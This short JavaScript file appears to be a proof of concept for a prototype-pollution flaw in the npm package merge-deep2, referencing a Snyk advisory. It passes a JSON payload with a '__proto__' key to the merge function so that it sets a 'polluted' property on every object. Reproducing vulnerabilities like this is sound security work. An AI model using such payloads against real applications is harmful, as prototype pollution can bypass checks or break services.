//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
 
  const mergeDeep2 = require("merge-deep2");
  let obj = {};
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

   

  mergeDeep2({}, JSON.parse(malicious_payload), true);
// End of file
